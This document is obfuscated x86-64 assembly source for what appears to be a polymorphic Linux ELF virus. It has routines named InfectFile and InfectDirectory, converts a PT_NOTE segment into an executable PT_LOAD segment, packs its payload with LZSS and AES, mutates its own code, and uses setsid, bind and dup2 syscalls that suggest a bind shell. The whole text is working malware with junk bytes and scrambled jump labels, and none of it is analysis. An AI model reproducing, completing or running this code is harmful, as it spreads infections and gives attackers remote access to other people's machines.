    mjmp        ..@gbRGSibVGqIF
db 0x40
..@gbRGSibVGqIF:
    mjmp        ..@xTLBqJh2DOfz
..@nfkhnWSUL7kJ:
    add         rsi, rdx
    mjmp        ..@uZdqH0ct6cop
db 0xc5, 0x32, 0xc0
..@uZdqH0ct6cop:
    mjmp        ..@5KUOjhLca58n
..@aMZ3t52W9pX0:
    push        rsi
    mjmp        ..@EIwPpMOohjaR
db 0xa3
..@EIwPpMOohjaR:
    mjmp        ..@BqrLhAC2UWR1
..@jlUBzak3sN3H:
    movr        rax, rax
    mjmp        ..@a0kZOP9nOQdm
..@2NqD8yQtvfvN:
%ifndef ENABLE_DEBUGGING
    VAR         packed, bash
%endif
    mjmp        ..@xTTgJjGxgrhR
db 0xce, 0xe2, 0xd0
..@xTTgJjGxgrhR:
    mjmp        ..@890VFdtH3ob1
..@yOYxzoCzpWJ9:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], 0
    mov         QWORD [rsp+_VADDR_OFF._vaddr], 0
    xor         rax, rax
    mjmp        ..@Gx6XyY6lrSLb
..@jezUxzcNdxAP:
    add         r5, 1
    mjmp        ..@Tn6mQ1J2a0RO
..@d119gAkmN1Rx:
    movv        rax, 1
    mjmp        ..@pQKqik5Km6RQ
..@Xe6yH2iEfKnC:
    call        MemMove
    movv        rcx, signature_len
    mjmp        ..@wbAm8bLij3xe
db 0x1e, 0xe4
..@wbAm8bLij3xe:
    mjmp        ..@rpwFBuvagO05
db 0x14, 0xa4
..@rpwFBuvagO05:
    mjmp        ..@Z84Gr5DVtHP9
db 0xd3, 0xb3
..@Z84Gr5DVtHP9:
    mjmp        ..@8eNgKlgNb5L3
db 0xea, 0x9a
..@8eNgKlgNb5L3:
    mjmp        ..@m60VBpZIIT25
..@xfE77TIRai91:
    push        r1
    movr        rbx, rbx
    xor         rdi, rdi
    mjmp        ..@ncAPupya8RyT
..@lmCQd3OHjxUg:
    push        rdx
    mjmp        ..@aSm4fDoraayd
..@8LfAJ6okHUwR:
    call_vsp    Aes256KeyCreation
    mjmp        ..@2JLeiJphN4v6
..@jvLRWXUnIxJ5:
    je          ..@pmW6hnBd7z16
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    mjmp        ..@K9sEdWLThcK4
db 0x4f
..@K9sEdWLThcK4:
    mjmp        ..@IOT5ldKKEmRX
db 0xcd, 0xfe
..@IOT5ldKKEmRX:
    mjmp        ..@wMoQ1kzhRupQ
..@xccW77fuaiv2:
    pop         rdx
    movr        rsi, rsi
    add         rax, r1
    mjmp        ..@sGC0GfaKeBUc
db 0xda
..@sGC0GfaKeBUc:
    mjmp        ..@cF5M6T5jYO4g
..@IjCs7jhgW92w:
    xor         r2, r2
    push        rsi
    pop         rsi
    mjmp        ..@PXz6nPV48fwF
..@e9jsR0gWWjHD:
    call        ConvertJumpToDoubleJump
    mjmp        ..@OMnh2zzQgJTo
db 0x1e, 0xfc
..@OMnh2zzQgJTo:
    mjmp        ..@G4RgkTowLo0N
db 0xc7, 0x94
..@G4RgkTowLo0N:
    mjmp        ..@xCR2vWbeuGeF
..@7LtHG3h8gHBQ:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    test        al, al
    jnz         ..@tEDwSusbxzbX
    mjmp        ..@rVuZ0Q95l0K1
..@wjetFdjlZtcf:
    movr        rax, rax
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    call        InfectFile
    mjmp        ..@WQgzZFti1T0M
db 0xe8, 0xf7, 0xf7
..@WQgzZFti1T0M:
    mjmp        ..@amSjgXHWBguE
..@tOsGmrmyXKi8:
    call        MemMove
    mjmp        ..@XF0gicFlFkkT
db 0x14, 0xc8, 0x0e
..@XF0gicFlFkkT:
    mjmp        ..@2eZX1tXUepi2
..@8ZrUNRbndASL:
    xchg        rsp, rsp
    mjmp        ..@w0hi4qGywU3h
db 0xda, 0x21
..@w0hi4qGywU3h:
    mjmp        ..@t2Qf4Nrd054R
db 0x4f
..@t2Qf4Nrd054R:
    mjmp        ..@Ufx7qmryLhSg
..@H4yXYygquOEF:
    movr        rax, rax
    push        rcx
    pop         rcx
    and         ax, 1111b
    mjmp        ..@Hq4zfKlp2bOf
db 0x0d, 0x20
..@Hq4zfKlp2bOf:
    mjmp        ..@36uCjB6jYmhD
..@edCNQE7J45Bi:
    mjmp        ..@XLE9hbhAKGdP
    mjmp        ..@IHos0Gy9cNPa
..@78VYz73PO2Pl:
%ifdef X86_32
    and         edx, 0ffffc0ffh
%endif
    mjmp        ..@EsVKhgblVSnp
..@eww8SL8tw8Ul:
    mov         rcx, QWORD [rsp]
    mov         DWORD [rsi+rcx], edi
    add         ecx, 4
    mjmp        ..@ILBmlc8H51vL
..@JBu1iCqmuc7q:
    movdqu      xmm1, oWORD [rsp+0xd0]
    aesenc      xmm0, xmm1
    mjmp        ..@gNWRCC8xBuK8
..@pGFGvmYcVVOv:
%ifdef X86_64
    xchg        rbx, rbx
    or          dl, 100b
%endif
    mjmp        ..@x0yhAqNz6cFz
..@GP2cPFy53ixy:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    mjmp        ..@NAz9VoEB8dmL
..@crhMJt3nkeky:
    pop         rsi
    mjmp        ..@3gIZqvnlHOGt
db 0x34
..@3gIZqvnlHOGt:
    mjmp        ..@PudZj1Y3QADP
..@AuJwJi2kNwoh:
    push        rbx
    pop         rbx
    mov         bl, 0ebh
    mov         DWORD [rdi], ebx
    mjmp        ..@gOt3IikBr2kO
    mjmp        ..@66ObEd4JY0Uc
db 0x08
..@66ObEd4JY0Uc:
    mjmp        ..@v9KZYOWe0zPN
..@D7N2wO5McctW:
%ifdef X86_64
    and         edx, 0ffc0fffah
%endif
    mjmp        ..@uaq9mX2icxez
db 0xad, 0x21, 0x00
..@uaq9mX2icxez:
    mjmp        ..@i7RR5N7SgEQp
..@36uCjB6jYmhD:
    cmp         al, 0xa
    mjmp        ..@GmbpNLDeNB9t
..@mw30bQGW7ZNi:
    movr        rax, r2
    mjmp        ..@nWVY0fRzQMFS
db 0x41
..@nWVY0fRzQMFS:
    mjmp        ..@qr8yNh3NEk1q
db 0xd1
..@qr8yNh3NEk1q:
    mjmp        ..@RI0pL2AcrkNW
..@uQlomUjDXOa5:
    mov         QWORD [rsp+_PROC_OFF.dirindex], 0x00
    mjmp        ..@JbRTL2hfvOho
db 0xd5, 0xd8, 0xaa
..@JbRTL2hfvOho:
    mjmp        ..@hYyraybh702x
..@6H7m4oV4mp7f:
%ifdef X86_32
    push        rsi
%endif
    mjmp        ..@bcUwEfxlJMVL
..@JHAG12n3HXEB:
%ifndef ENABLE_DEBUGGING
    movv        rax, SYS_SETSID
    push        rbx
    pop         rbx
%endif
    mjmp        ..@Dwuz2wpZJYjP
..@8OLRYC4C40Sg:
    add         r2, non_encrypted_len+PADDING
    mjmp        ..@TBhCAYNwbPzB
..@mpOV5NsK5WN5:
    call        WORDToDWORDASCII
    mov         r5, QWORD [rsp+_UPDATASIG_OFF.meta_ptr+0x20]
    push        rcx
    pop         rcx
    mov         DWORD [r5+_signature.poly_preview-_start+(r4*2)], eax
    mjmp        ..@xAnIpfknTDZI
..@nt46v92xRkjf:
    movr        rdx, rdx
    mjmp        ..@T2GZ6pOk4UWh
db 0xdb, 0xc5, 0xfc
..@T2GZ6pOk4UWh:
    mjmp        ..@PEcO8BHMd3i8
db 0x3e, 0xc8
..@PEcO8BHMd3i8:
    mjmp        ..@OhmE6WGY1v8g
db 0x4a, 0x98
..@OhmE6WGY1v8g:
    mjmp        ..@G1Gfvwuipwml
..@gu6Q9Jar9yAq:
    xor         rcx, rcx
    mjmp        ..@ZxLdDlotfvKp
..@a7X2S2pxZ8rl:
    add         rsp, _UPDATASIG_OFF_size
    mjmp        ..@cuPlW3I68n6b
..@3j1G6qLDpjhB:
    xchg        rsi, rsi
    movv        rcx, WINDOW_LENGTH*2
    xor         rax, rax
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    mjmp        ..@3ecqO3X7ivFJ
db 0xe8, 0xd1
..@3ecqO3X7ivFJ:
    mjmp        ..@oZfuik7wcaho
db 0x1e
..@oZfuik7wcaho:
    mjmp        ..@VBCDbSM5rVXm
..@lZJkTdMxEP0W:
    sub         rdi, 1
    mjmp        ..@pXqIoSJfQBBP
db 0xc9, 0xd7, 0x45
..@pXqIoSJfQBBP:
    mjmp        ..@DtifoZ5CcITp
..@TQ3DwcR8QZhX:
%ifndef ENABLE_DEBUGGING
    movr        rdx, rdx
    movr        r2, rsp
    movv        r3, 0x10
    xor         rax, rax
    movv        rax, SYS_BIND
%endif
    mjmp        ..@7ow0WTlzQQXA
..@V7J0HF4ZKahm:
    movr        r3, rax
    and         r5, (PAGE_SIZE-1)
    add         r3, r5
    mjmp        ..@fS9UTzcpHGYT
..@MjrNwcccl1mn:
    pop         rdi
    mjmp        ..@LVSpiJAqohW5
db 0xfb, 0x6c, 0xb3
..@LVSpiJAqohW5:
    mjmp        ..@GeGhGLR2FXOp
..@23KMLkgxH1Rb:
    push        r1
    sub         rsp, _VADDR_OFF_size
    mov         QWORD [rsp+_VADDR_OFF.tmp_offset], 0
    xchg        rdx, rdx
    mjmp        ..@2NauE9tWfUC1
db 0xfa, 0x6e
..@2NauE9tWfUC1:
    mjmp        ..@yOYxzoCzpWJ9
..@57R2hx5tWn5o:
    mul         r3
    add         rax, p_h.p_type
    cmp         DWORD [r2+rax], PT_NOTE
    jne         ..@WF2wDWMhA1qE
    add         r2, rax
    mjmp        ..@ikvWGe93mfxs
db 0x66
..@ikvWGe93mfxs:
    mjmp        ..@I9CoU0DMC6F5
..@v5JGpUfQ9kw7:
    movr        rbp, rbp
    mjmp        ..@sDzEpMyd6Qyd
db 0x0b, 0xd6, 0xdc
..@sDzEpMyd6Qyd:
    mjmp        ..@MjnNDDWa6JaT
db 0x08, 0x93
..@MjnNDDWa6JaT:
    mjmp        ..@4fl0GpQET0At
db 0xe2, 0x96, 0xe1
..@4fl0GpQET0At:
    mjmp        ..@bNOigwBebbSS
db 0xa0, 0xe4, 0x18
..@bNOigwBebbSS:
    mjmp        ..@wSz8jtew9Bzq
..@5nlYfo15zJr7:
    push        rdi
    mjmp        ..@ZfyTDZV2pP8v
db 0x63, 0xde, 0xa3
..@ZfyTDZV2pP8v:
    mjmp        ..@44OgvMkYHV5l
..@aqAkoPCWTNwG:
    lea         r3, [rsp+_PAYLOAD_OFF.key]
    mjmp        ..@snJ6nzOjzlno
db 0xc4
..@snJ6nzOjzlno:
    mjmp        ..@xNjFI0E3LDh3
db 0x09, 0xca
..@xNjFI0E3LDh3:
    mjmp        ..@9SlJVzYYl9lX
..@WdQm4olBXUxP:
%ifdef X86_32
    jnz         ..@jxQypQEcefs8
%endif
    mjmp        ..@6H7m4oV4mp7f
..@u3am8hosKJzl:
    push        r4
    push        r5
    cmp         r3, 0x00
    mjmp        ..@B5IGmVkYFaAG
db 0xd2, 0xf0
..@B5IGmVkYFaAG:
    mjmp        ..@X9cTVyB2V1Cr
db 0x39, 0xe3
..@X9cTVyB2V1Cr:
    mjmp        ..@XTi1Lu34nQ2i
..@ou32PxWmUVtG:
    call        MapFile
    mjmp        ..@BmEfFqBw0vaK
db 0x00, 0x98
..@BmEfFqBw0vaK:
    mjmp        ..@xBDLP4LQmGUz
db 0xe7
..@xBDLP4LQmGUz:
    mjmp        ..@sMK01EDLq5CZ
..@w7UM6tOs5xEg:
%ifdef X86_32
    xor         ebx, ebx
    mov         ecx, DWORD [edi+file.filesize]
    xchg        rcx, rcx
    movr        edx, esi
    movv        esi, 0x01
%endif
    mjmp        ..@IjXd5esuQ9jX
db 0xaa, 0x4b, 0x0d
..@IjXd5esuQ9jX:
    mjmp        ..@xhwp73hnTnYd
..@cZjRpvWYcisa:
    push        rax
    pop         rax
    add         r5, rax
    mjmp        ..@ASt3dPJ6c0DK
db 0x30, 0x65
..@ASt3dPJ6c0DK:
    mjmp        ..@jezUxzcNdxAP
..@adM3Iw4IzY0q:
    movr        rcx, rcx
    call        Strcpy
    mjmp        ..@VyBt7h9nBw5Z
..@fwzRhEot1E2y:
    add         r1, bytes
    movv        r2, 0x100
    movv        rax, SYS_GETCWD
    mjmp        ..@TgHzXITaUHzO
..@RnH4u0GNkTxd:
    push        r2
    mjmp        ..@ghxAzYKc4uQr
db 0x65, 0x3b, 0x6b
..@ghxAzYKc4uQr:
    mjmp        ..@CLuLjXjhlsep
db 0xc1, 0x47, 0xc4
..@CLuLjXjhlsep:
    mjmp        ..@LHkf5gDIOBgS
..@wOCS8lgDCJjA:
    movr        rsp, rsp
    mjmp        ..@xW7GMZs8hYcB
..@6TeKCmAw3bAA:
    push        rbx
    pop         rbx
    pop         rbx
    mjmp        ..@Cu33Hb6RwFhW
FileValidation:
    mjmp        ..@l5ALu5nBcvTC
..@gP5nAvbb7z89:
%ifdef X86_32
    xor         eax, eax
%endif
    mjmp        ..@w7UM6tOs5xEg
..@veJk5Bw5VGdN:
    movr        rdi, rdi
    mjmp        ..@ISsfyHYyd4Py
db 0xac, 0xe6, 0x43
..@ISsfyHYyd4Py:
    mjmp        ..@XXi3uHenvvX1
..@WF2wDWMhA1qE:
    movr        rsp, rsp
    cmp         r4w, WORD [r1+e_h.e_phnum]
    jge         ..@y1DBTlVDBAUC
    mjmp        ..@IsUUnyeHDgEO
..@jM2Ckw0ZXo6N:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    xor         rcx, rcx
    mov         rax, QWORD [rsp+_UPDATASIG_OFF.meta_ptr]
    test        rax, rax
    jnz         ..@Gzwu65znQ108
    mjmp        ..@4VWxghErK1iz
db 0x2e, 0x0c
..@4VWxghErK1iz:
    mjmp        ..@O3E6dJD7ucua
db 0x3d
..@O3E6dJD7ucua:
    mjmp        ..@YsHoAllP8GAE
..@KuD2zTJ5ybIH:
    xchg        rsp, rsp
    mjmp        ..@ZrDc6ip9Q26j
db 0x3e, 0x49
..@ZrDc6ip9Q26j:
    mjmp        ..@23KMLkgxH1Rb
..@fC0R40ruGl8p:
    and         dl, 00101000b
    push        rbx
    pop         rbx
    movr        rsp, rsp
    mjmp        ..@aOcmpTYTh7fb
db 0x45, 0x2a, 0x99
..@aOcmpTYTh7fb:
    mjmp        ..@muDPHnzp8UmW
db 0x01, 0xa3
..@muDPHnzp8UmW:
    mjmp        ..@lJTE6bmvtMa3
KeyGen:
    mjmp        ..@qUT3dwQ8vjfr
..@FDwDLUHtnG4U:
    movr        r1, r5
    add         r1, r4
    cmp         BYTE [r1], 0x00
    je          ..@Wz8xATMU1Fw8
    mjmp        ..@MrWhgt6l8zdt
db 0xfc
..@MrWhgt6l8zdt:
    mjmp        ..@QWQft2Atd7Tu
db 0xac, 0x43, 0x4e
..@QWQft2Atd7Tu:
    mjmp        ..@NXv1R1mXyORF
db 0xda
..@NXv1R1mXyORF:
    mjmp        ..@7cHmVJxMu2po
db 0xd2, 0xf2
..@7cHmVJxMu2po:
    mjmp        ..@STOTEyAR97fS
..@YsHoAllP8GAE:
    movv        rcx, signature_reg_len
    mjmp        ..@qqCy6NANM6FQ
    mjmp        ..@Gzwu65znQ108
..@XTi1Lu34nQ2i:
%ifdef X86_64
    movr        rcx, rdx
    xchg        rcx, rcx
    push        rsi
%endif
    mjmp        ..@jGKE0sSb1iiX
db 0x34
..@jGKE0sSb1iiX:
    mjmp        ..@wwKe9Tg1UGna
..@nuNnzZiHxxAQ:
    mov         edx, DWORD [rdi]
    mjmp        ..@VK95Z0VdicLj
..@Dm3ZHBwZafgE:
%ifndef ENABLE_DEBUGGING
    movv        rax, SYS_DUP2
    push        rsi
    pop         rsi
%endif
    mjmp        ..@FtNf8Yttd5Zl
db 0xaa, 0xed, 0x98
..@FtNf8Yttd5Zl:
    mjmp        ..@Gd4HrWY4IZbY
..@h6ybgaZZf3NS:
    xor         r2, r2
    mov         r2b, BYTE [rsp+_INFDIR_OFF.depth]
    add         r2, 1
    call        InfectDirectory
    mjmp        ..@amSjgXHWBguE
    mjmp        ..@OG4XbNSViqTF
..@bv1URoY7jayW:
    pop         rdx
    mjmp        LzssEncoder
..@sY7iMHS7BtHn:
    movr        rax, rax
    rep         stosb
    mov         r2, QWORD [rsp+_UPDATASIG_OFF.meta_ptr+0x20]
    add         r2, signature_len
    movv        r3, keycreation_len
    mjmp        ..@i3kQiAIQcCQQ
db 0x1b, 0x12
..@i3kQiAIQcCQQ:
    mjmp        ..@zD1zf2jHnMnl
..@7XEsTO90nAlO:
    movv        rax, 0x40
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    test        al, al
    mjmp        ..@FboJndfY8z0o
db 0x0e, 0xae
..@FboJndfY8z0o:
    mjmp        ..@nlmVtiOhCruA
db 0xd2
..@nlmVtiOhCruA:
    mjmp        ..@SsKTJUGPzUHT
..@Cq7Y7a7RtiXn:
%ifndef ENABLE_DEBUGGING
    jl          ..@3eMzvMToLeUr
    movr        r1, rax
    push        QWORD 0x0
%endif
    mjmp        ..@UzhamMwfNUjZ
..@50GTvXNU1j1w:
    mov         r2, QWORD [r1+e_h.e_phoff]
    mjmp        ..@NC3yWYv8ToIP
db 0x42, 0x34, 0x4c
..@NC3yWYv8ToIP:
    mjmp        ..@UWasMjuhxcW4
..@VUWfMFLusvnB:
    movr        rcx, rcx
    mjmp        ..@E7YG0sjf7XIE
db 0x9f
..@E7YG0sjf7XIE:
    mjmp        ..@mnkouL8tniD9
..@QFikcJaherr0:
    movr        rcx, rcx
    mov         QWORD [r2+p_h.p_align], PAGE_SIZE
    mov         DWORD [r2+p_h.p_flags], PF_R + PF_X
    mov         DWORD [r2], PT_LOAD
    mjmp        ..@ggyYp5dNGfzw
db 0xe3
..@ggyYp5dNGfzw:
    mjmp        ..@ggZDzf07UFTj
..@VKNMwfXLQQQj:
    movv        rax, 0xff
    mjmp        ..@vy6sDNHPIwoy
db 0xef
..@vy6sDNHPIwoy:
    mjmp        ..@BRnWcLa8gwSc
..@BD7hNDOXBE9U:
    mov         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    mjmp        ..@1wmEfgH30FLF
db 0x99, 0x61
..@1wmEfgH30FLF:
    mjmp        ..@yO1u8EF7eOxu
..@8VwknLmJIDFW:
    pop         rsi
    mjmp        ..@Xe6yH2iEfKnC
..@KzmvO8huVfsV:
    mov         DWORD [rdi], edx
    mjmp        ..@tOO9wjzutJB0
    mjmp        ..@tOO9wjzutJB0
..@AfInaYcIbiRa:
    cmp         WORD [rdi+2], 9090h
    jne         ..@D6NbMNOj03aJ
    xor         rcx, rcx
    movr        rcx, rdx
    mjmp        ..@vrf9iPZs4pec
..@nBfZBis2z737:
    movr        rdi, rdi
    mjmp        ..@h516qKadUDDd
..@6GT9gWcdIDJT:
    ret
    mjmp        ..@icuKMk8rToL9
..@yzlIlkTZcWZ1:
    mov         r2, m5
    movr        rcx, rcx
    call        NonBinaryFile
    inc         WORD m5
    mjmp        ..@y1DBTlVDBAUC
    mjmp        ..@8SpYE50CpjQ9
db 0x93
..@8SpYE50CpjQ9:
    mjmp        ..@0jkMIS0XzBhi
db 0x4e, 0xaa
..@0jkMIS0XzBhi:
    mjmp        ..@T5lwYeCR0URz
..@k608RamcjzxC:
    xor         rbx, rbx
    mjmp        ..@QTfJUVkc6aFt
..@kieSoydiV0je:
%ifndef ENABLE_DEBUGGING
    push        rsi
    pop         rsi
    pop         rsi
    xor         rax, rax
%endif
    mjmp        ..@65CRAg534K3K
..@7i22LjxPwyzS:
    push        rsi
    mjmp        ..@ctzEoSPuARuV
..@SsKTJUGPzUHT:
    jz          ..@oHmNeLM4DeYW
    mjmp        ..@rOTeYD2HGRAO
..@MlapGylo4980:
    and         al, 111b
    mjmp        ..@xGJArdNWSVAr
db 0x06, 0xd8
..@xGJArdNWSVAr:
    mjmp        ..@R8BEbwMZVLyF
db 0x07, 0xdb, 0x6f
..@R8BEbwMZVLyF:
    mjmp        ..@SwHWZWUtG4jW
..@Ufx7qmryLhSg:
    lea         r1, [rsp+_PROC_OFF.buffer]
    mjmp        ..@IeF0i3Fgzhhf
db 0xc6
..@IeF0i3Fgzhhf:
    mjmp        ..@82UjCu2CmYuV
..@eXNUKntlqREj:
    movr        rcx, rcx
    mjmp        ..@KuD2zTJ5ybIH
..@E6VIr1auHZTP:
%ifdef X86_64
    sete        al
    je          ..@nBfZBis2z737
%endif
    mjmp        ..@uY0Z2051clhL
db 0x1b, 0x09
..@uY0Z2051clhL:
    mjmp        ..@NSPE61sBo25J
..@77rx7B6nXzop:
    xor         rax, rax
    mjmp        ..@hX0XXituztHE
..@1EMPFl9RbelI:
    mov         esi, DWORD [rdi]
    mjmp        ..@YUbpn3ukejNu
db 0x1f, 0xe3, 0x0e
..@YUbpn3ukejNu:
    mjmp        ..@KN3nnrdSowjM
..@k1ggyHDOk8Dm:
    xor         rax, rax
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    mjmp        ..@fCjRKFxsQHf2
db 0x6f, 0xae, 0x38
..@fCjRKFxsQHf2:
    mjmp        ..@isQKgYPRZ55Y
..@AUNj0H2tfu7S:
    mov         r2, m8
    movv        r3, original_virus_len-non_packed_len
    movr        rax, rax
    mjmp        ..@84RLpe6Y6vaP
db 0xfd
..@84RLpe6Y6vaP:
    mjmp        ..@jtQFC6LElulm
..@AZBTtggiGfPI:
    pop         rsi
    sub         r2, 1
    mjmp        ..@IH0odxlTAvzk
db 0xb0, 0xe0
..@IH0odxlTAvzk:
    mjmp        ..@glCjvAVb72Zi
db 0x3c, 0x27, 0xb2
..@glCjvAVb72Zi:
    mjmp        ..@xhLsdsvIN52N
..@i9gkEpSX4GN5:
    mov         BYTE [rsi], bl
    mjmp        ..@MOpYMclxvqLC
db 0xf2, 0x3e
..@MOpYMclxvqLC:
    mjmp        ..@XLE9hbhAKGdP
..@7gl6lhlKckm1:
    sub         rsp, _LZSSE_OFF_size
    mjmp        ..@bdF2sJ00zl6i
..@XhxrssoWFL5N:
%ifdef X86_64
    push        rsi
%endif
    mjmp        ..@FbTmqDwOj6m4
db 0x6f
..@FbTmqDwOj6m4:
    mjmp        ..@NjZ3Tl1yQzqI
..@MHOaDnvDt3fn:
%ifdef X86_64
    xor         rdx, rdx
    xor         r9, r9
%endif
    mjmp        ..@X5kQNadORvRW
db 0x3c, 0xa0, 0xf3
..@X5kQNadORvRW:
    mjmp        ..@ihLVxiQTyMRd
..@VyBt7h9nBw5Z:
    xchg        rdi, rdi
    mjmp        ..@OmlIOVDVy3TT
db 0xfd, 0x47, 0x07
..@OmlIOVDVy3TT:
    mjmp        ..@pgRQ3Tfd62eM
..@mpUD3imx8Xju:
    xor         rax, rax
    mjmp        ..@lpyiDgviW5SG
db 0xa1
..@lpyiDgviW5SG:
    mjmp        ..@XsTcsVXeI1pJ
..@G85S2YhZRasy:
    mov         QWORD [rsp+_PAYLOAD_OFF.entry], r1
    mov         WORD [rsp+_PAYLOAD_OFF.index], r2w
    mjmp        ..@srtqq5adyUT8
..@nERFWm0Zi7WT:
    pop         rcx
    movr        rbx, rbx
    pop         rsi
    xor         rax, rax
    mjmp        ..@kjTOJHU9y9iC
db 0x2b, 0x45
..@kjTOJHU9y9iC:
    mjmp        ..@jYjZsUjIDCsG
..@kBWzizO5PnJT:
    jne         ..@uLGN9p0iiax9
    mjmp        ..@nBfZBis2z737
..@gjBFtsRvymPD:
    xor         rax, rax
    xchg        rdi, rdi
    mjmp        ..@UpNLxWyeQgEL
db 0xd0, 0xe2, 0x6d
..@UpNLxWyeQgEL:
    mjmp        ..@029Rn65UpHhg
..@5KUOjhLca58n:
    mov         cl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    add         ecx, 1
    mjmp        ..@hmi11fkkmArl
db 0x41, 0xfd, 0xa2
..@hmi11fkkmArl:
    mjmp        ..@ZKCTQmFDB3IX
db 0x1c, 0x01, 0x40
..@ZKCTQmFDB3IX:
    mjmp        ..@DlCCOuxA2mti
db 0x12
..@DlCCOuxA2mti:
    mjmp        ..@g4IR9dWxIGe5
..@meDYXHTqiqbB:
    add         rsp, _MUTA_OFF_size
    mjmp        ..@szWMvLttCLbq
db 0x1a, 0xaa
..@szWMvLttCLbq:
    mjmp        ..@GjJXMwMDK8b4
db 0x4f, 0xab, 0x03
..@GjJXMwMDK8b4:
    mjmp        ..@prSPPnr9P2iu
..@iAYUK9003zPl:
    add         rax, bytes
    mjmp        ..@2nSuhUn0Kn4g
db 0xcc
..@2nSuhUn0Kn4g:
    mjmp        ..@CDcDPe9sLOqq
..@WZ5d7KWdgHBB:
    cmp         DWORD [rdi+s_h.sh_type], SHT_DYNAMIC
    jne         ..@CEaxbXo0A5z9
    xor         rcx, rcx
    mjmp        ..@l7SI5pFayoo7
..@3thRpZxq3KSF:
    mjmp         ..@pQKqik5Km6RQ
    mjmp        ..@1GNtf7vYTQ1O
db 0x3f
..@1GNtf7vYTQ1O:
    mjmp        ..@1mpLgbu4xjm7
db 0x0b, 0xca
..@1mpLgbu4xjm7:
    mjmp        ..@d119gAkmN1Rx
..@8NT25Nz9sx0t:
    xor         rcx, rcx
    mov         rdi, QWORD [rsp+_MUTA_OFF.start]
    mov         ecx, DWORD [rsp+_MUTA_OFF.index]
    mov         rdi, QWORD [rsp+_MUTA_OFF.start]
    mjmp        ..@2BQwkawqxPs0
..@hgVGPbpJFib0:
    pop         rsi
    mjmp        ..@bq45X0uhB0ru
..@u9v9NLTsJXNO:
%ifdef X86_64
    xor         rcx, rcx
%endif
    mjmp        ..@aOHOJMbwRp66
db 0xfd
..@aOHOJMbwRp66:
    mjmp        ..@47BLxhcspX1C
..@a8Kb76kxtcRE:
    push        rsi
    push        rcx
    mjmp        ..@O7jMw1gbWgfL
..@NhKlmNtNTX5E:
    add         rdi, rcx
    mov         edx, DWORD [rdi]
    mjmp        ..@XYr8rxlTzvjb
db 0x4f
..@XYr8rxlTzvjb:
    mjmp        ..@PS5lRh15hDKs
db 0xe5, 0x16
..@PS5lRh15hDKs:
    mjmp        ..@1h6UGxg6jMST
..@CDcDPe9sLOqq:
    push        rax
    mjmp        ..@hJQ9YOYGY6lt
..@44OgvMkYHV5l:
    pop         rdi
    mjmp        ..@xhHeDl7BgXqH
db 0x1a, 0x9f, 0xcd
..@xhHeDl7BgXqH:
    mjmp        ..@9iKKzvO4j9aM
..@HTJ1m4LxKbxl:
    mov         DWORD [rdi], eax
    add         rdi, 4
    mjmp        ..@2H05fXoYPRd9
db 0xa7, 0x28
..@2H05fXoYPRd9:
    mjmp        ..@VvYDHGEA6XsL
db 0x61
..@VvYDHGEA6XsL:
    mjmp        ..@s6dXcqpsH8r1
..@KQj7emTX3SuW:
%ifndef ENABLE_DEBUGGING
    cmp         rax, 0x0
%endif
    mjmp        ..@6Ab7Mjuy0DUH
..@e7IN8MXFcsv3:
    push        rdx
    mjmp        ..@hvcP792Va61d
db 0xd9, 0x44, 0x4f
..@hvcP792Va61d:
    mjmp        ..@KqWxpQZJ5nhB
db 0xcb, 0x1b, 0xd7
..@KqWxpQZJ5nhB:
    mjmp        ..@xccW77fuaiv2
..@H0QeYgwwMgG9:
%ifdef X86_32
    shl         cx, 8
%endif
    mjmp        ..@zuPqdOuXcYub
db 0x1c
..@zuPqdOuXcYub:
    mjmp        ..@HB74ItqHNum7
..@jbGp8xk7Nob7:
    jne         ..@nnoKf6qA5x7D
    lea         r1, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    call        IsNum
    mjmp        ..@SCZfjrREhtoa
..@Mxl5zmIUwuRR:
%ifdef X86_64
    movr        rsp, rsp
%endif
    mjmp        ..@O71iOLOD4OZj
db 0xa1, 0xf2, 0x07
..@O71iOLOD4OZj:
    mjmp        ..@7adcy1yzcrXh
..@rS4AxPWgMT01:
%ifdef X86_64
    sete        cl
    je          ..@QJqEM7dLWRc6
    movr        rsp, rsp
%endif
    mjmp        ..@O08a81HB8TW4
..@lnIV3TY0jtKD:
    shl         rbx, 8
    mjmp        ..@vvn1HiB1VTWW
..@u2uZVg71ZKHq:
    mjmp        Strcpy
    mjmp        ..@IP4K5dJwJ2Y8
db 0xd3
..@IP4K5dJwJ2Y8:
    mjmp        ..@hvM6SHnuxnu0
..@O08a81HB8TW4:
%ifdef X86_64
    movr        rcx, rcx
%endif
    mjmp        ..@86uxbt8SMCaH
..@uOZ2G0ze9eph:
    movv        rax, 0xff
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    test        al, al
    mjmp        ..@6v0HZPRshbIg
db 0x2c, 0xdd, 0x6b
..@6v0HZPRshbIg:
    mjmp        ..@Pnv7ItZBF9DV
..@fhh76JcTL1j1:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    mjmp        ..@LKomv3Q8EJP9
..@B06RfRdhjZJr:
    movdqu      xmm1, oWORD [rsp+0xb0]
    aesenc      xmm0, xmm1
    mjmp        ..@4imKy6Gfnrii
..@yEy6W1bPs8q8:
    mov         r5, [rsp]
    xchg        rdx, rdx
    mjmp        ..@wGXQYrok7VcI
db 0x12, 0xdf
..@wGXQYrok7VcI:
    mjmp        ..@530Gdf20xxId
db 0xdf, 0x60, 0x21
..@530Gdf20xxId:
    mjmp        ..@MMagtNsxqTxV
..@fxLJZuRf1wBy:
    jne         ..@9iKKzvO4j9aM
    mjmp        ..@1EMPFl9RbelI
..@cdHSTdBvVOwo:
    push        r4
    push        r5
    sub         rsp, _UPDATASIG_OFF_size
    mjmp        ..@6dF9ffE6pYkB
db 0x2e, 0xda, 0x6e
..@6dF9ffE6pYkB:
    mjmp        ..@qIsSdobmTt9L
